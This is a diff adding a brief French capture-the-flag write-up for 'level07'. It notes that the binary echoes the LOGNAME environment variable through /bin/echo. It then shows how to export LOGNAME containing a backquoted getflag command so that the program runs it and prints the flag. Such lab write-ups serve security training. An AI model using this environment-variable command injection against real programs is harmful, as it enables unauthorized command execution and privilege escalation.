@@ -1,0 +1,14 @@
+en executant le binaire, level07 apparait
+
+en faisant un strings level07 on voie
+    -LOGNAME
+    -/bin/echo %s
+
+le binaire utilise la variable LOGNAME presente dans env pour afficher son nom
+LOGNAME = level07
+
+Pour obtenir le flag, il faut changer LOGNAME
+    -export LOGNAME = \`getflag\`
+    -./level07
+
+et on obtient le flag
